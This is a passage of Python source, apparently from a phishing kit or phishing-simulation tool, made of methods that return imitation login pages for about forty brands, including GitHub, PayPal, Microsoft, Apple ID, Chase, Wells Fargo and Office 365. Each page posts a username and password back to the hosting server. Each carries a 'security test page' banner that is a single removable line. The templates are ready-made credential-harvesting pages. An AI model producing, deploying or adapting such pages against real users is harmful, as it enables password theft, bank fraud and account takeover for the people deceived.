        return """<!DOCTYPE html><html><head><title>GitHub</title><style>body{font-family:-apple-system;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}.logo{color:#24292f;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">GitHub</div><form method="POST"><input type="text" name="username" placeholder="Username or email address" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _paypal_template(self):
        return """<!DOCTYPE html><html><head><title>PayPal</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}.logo{color:#003087;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">PayPal</div><form method="POST"><input type="text" name="email" placeholder="Email or mobile number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _amazon_template(self):
        return """<!DOCTYPE html><html><head><title>Amazon</title><style>body{font-family:Arial;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border:1px solid #ddd;border-radius:8px;padding:32px;width:400px}.logo{color:#ff9900;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#ff9900;color:#000;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">amazon</div><form method="POST"><input type="text" name="email" placeholder="Email or mobile phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _netflix_template(self):
        return """<!DOCTYPE html><html><head><title>Netflix</title><style>body{font-family:Helvetica;background:#141414;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#000;border-radius:4px;padding:48px;width:400px}.logo{color:#e50914;font-size:40px;text-align:center}input{width:100%;padding:16px;margin:10px 0;background:#333;border:none;border-radius:4px;color:#fff}button{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">NETFLIX</div><form method="POST"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _spotify_template(self):
        return """<!DOCTYPE html><html><head><title>Spotify</title><style>body{font-family:Circular,Helvetica;background:#121212;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#000;border-radius:8px;padding:48px;width:400px}.logo{color:#1ed760;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;background:#3e3e3e;border:none;border-radius:40px;color:#fff}button{width:100%;padding:14px;background:#1ed760;color:#000;border:none;border-radius:40px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Spotify</div><form method="POST"><input type="text" name="email" placeholder="Email or username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _microsoft_template(self):
        return """<!DOCTYPE html><html><head><title>Microsoft</title><style>body{font-family:Segoe UI;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:4px;padding:48px;width:400px}.logo{color:#f25022;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:2px}button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Microsoft</div><form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _apple_template(self):
        return """<!DOCTYPE html><html><head><title>Apple ID</title><style>body{font-family:SF Pro Text;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:48px;width:400px}.logo{color:#000;font-size:40px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo"></div><h2>Sign in with your Apple ID</h2><form method="POST"><input type="text" name="email" placeholder="Apple ID" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _whatsapp_template(self):
        return """<!DOCTYPE html><html><head><title>WhatsApp Web</title><style>body{font-family:Helvetica;background:#075e54;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#25d366;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#25d366;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">WhatsApp</div><form method="POST"><input type="text" name="username" placeholder="Phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _telegram_template(self):
        return """<!DOCTYPE html><html><head><title>Telegram Web</title><style>body{font-family:-apple-system;background:#2aabee;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#2aabee;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#2aabee;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Telegram</div><form method="POST"><input type="text" name="username" placeholder="Phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _discord_template(self):
        return """<!DOCTYPE html><html><head><title>Discord</title><style>body{font-family:Whitney,Helvetica;background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#36393f;border-radius:8px;padding:40px;width:400px}.logo{color:#fff;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#202225;border:none;border-radius:4px;color:#fff}button{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Discord</div><form method="POST"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _tiktok_template(self):
        return """<!DOCTYPE html><html><head><title>TikTok</title><style>body{font-family:Arial;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#010101;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#fe2c55;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">TikTok</div><form method="POST"><input type="text" name="email" placeholder="Email or username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _snapchat_template(self):
        return """<!DOCTYPE html><html><head><title>Snapchat</title><style>body{font-family:Arial;background:#fffc00;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#fffc00;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#fffc00;color:#000;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Snapchat</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _reddit_template(self):
        return """<!DOCTYPE html><html><head><title>Reddit</title><style>body{font-family:Arial;background:#dae0e6;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:32px;width:400px}.logo{color:#ff4500;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#ff4500;color:#fff;border:none;border-radius:24px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Reddit</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _protonmail_template(self):
        return """<!DOCTYPE html><html><head><title>ProtonMail</title><style>body{font-family:Arial;background:#505061;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#505061;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#505061;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">ProtonMail</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _yahoo_template(self):
        return """<!DOCTYPE html><html><head><title>Yahoo</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#410093;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#410093;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Yahoo</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _slack_template(self):
        return """<!DOCTYPE html><html><head><title>Slack</title><style>body{font-family:Arial;background:#611f69;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#611f69;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#611f69;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Slack</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _zoom_template(self):
        return """<!DOCTYPE html><html><head><title>Zoom</title><style>body{font-family:Arial;background:#2d8cff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#2d8cff;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#2d8cff;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Zoom</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _teams_template(self):
        return """<!DOCTYPE html><html><head><title>Microsoft Teams</title><style>body{font-family:Segoe UI;background:#5059e8;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#5059e8;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#5059e8;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Teams</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _wordpress_template(self):
        return """<!DOCTYPE html><html><head><title>WordPress</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#21759b;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#21759b;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">WordPress</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _shopify_template(self):
        return """<!DOCTYPE html><html><head><title>Shopify</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#96bf48;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#96bf48;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Shopify</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _steam_template(self):
        return """<!DOCTYPE html><html><head><title>Steam</title><style>body{font-family:Arial;background:#1b2838;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#171d25;border-radius:8px;padding:40px;width:400px}.logo{color:#67c1f5;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#323c46;border:none;border-radius:4px;color:#fff}button{width:100%;padding:12px;background:#67c1f5;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Steam</div><form method="POST"><input type="text" name="username" placeholder="Steam Account Name" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _roblox_template(self):
        return """<!DOCTYPE html><html><head><title>Roblox</title><style>body{font-family:Arial;background:#1f2b3a;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#e32c2c;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#e32c2c;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Roblox</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _twitch_template(self):
        return """<!DOCTYPE html><html><head><title>Twitch</title><style>body{font-family:Arial;background:#19171c;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#9146ff;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#9146ff;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Twitch</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _epic_games_template(self):
        return """<!DOCTYPE html><html><head><title>Epic Games</title><style>body{font-family:Arial;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#000;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#000;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">EPIC GAMES</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _minecraft_template(self):
        return """<!DOCTYPE html><html><head><title>Minecraft</title><style>body{font-family:Arial;background:#2c2e33;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#6b8c42;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#6b8c42;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Minecraft</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _xbox_template(self):
        return """<!DOCTYPE html><html><head><title>Xbox</title><style>body{font-family:Segoe UI;background:#107c10;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#107c10;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#107c10;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Xbox</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _playstation_template(self):
        return """<!DOCTYPE html><html><head><title>PlayStation Network</title><style>body{font-family:Arial;background:#003791;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#003791;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#003791;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">PlayStation</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _cashapp_template(self):
        return """<!DOCTYPE html><html><head><title>Cash App</title><style>body{font-family:Arial;background:#00d632;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#00d632;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#00d632;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Cash App</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _venmo_template(self):
        return """<!DOCTYPE html><html><head><title>Venmo</title><style>body{font-family:Arial;background:#008cff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#008cff;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#008cff;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Venmo</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _chase_template(self):
        return """<!DOCTYPE html><html><head><title>Chase Bank</title><style>body{font-family:Arial;background:#1174c2;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#1174c2;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#1174c2;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Chase</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _wells_fargo_template(self):
        return """<!DOCTYPE html><html><head><title>Wells Fargo</title><style>body{font-family:Arial;background:#bc1f2c;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#bc1f2c;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#bc1f2c;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Wells Fargo</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _office365_template(self):
        return """<!DOCTYPE html><html><head><title>Office 365</title><style>body{font-family:Segoe UI;background:#0078d4;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#0078d4;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Office 365</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _onedrive_template(self):
        return """<!DOCTYPE html><html><head><title>OneDrive</title><style>body{font-family:Segoe UI;background:#0078d4;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#0078d4;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">OneDrive</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _icloud_template(self):
        return """<!DOCTYPE html><html><head><title>iCloud</title><style>body{font-family:SF Pro Text;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:48px;width:400px;box-shadow:0 2px 12px rgba(0,0,0,0.1)}.logo{color:#000;font-size:40px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">iCloud</div><h2>Sign in to iCloud</h2><form method="POST"><input type="text" name="email" placeholder="Apple ID" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _adobe_template(self):
        return """<!DOCTYPE html><html><head><title>Adobe</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#ff0000;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#ff0000;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Adobe</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _dropbox_template(self):
        return """<!DOCTYPE html><html><head><title>Dropbox</title><style>body{font-family:Arial;background:#0061ff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#0061ff;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#0061ff;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Dropbox</div><form method="POST"><input type="text" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _gitlab_template(self):
        return """<!DOCTYPE html><html><head><title>GitLab</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#fc6d26;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#fc6d26;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">GitLab</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _bitbucket_template(self):
        return """<!DOCTYPE html><html><head><title>Bitbucket</title><style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#0052cc;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#0052cc;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head><body><div class="login-box"><div class="logo">Bitbucket</div><form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form><div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _pinterest_template(self):
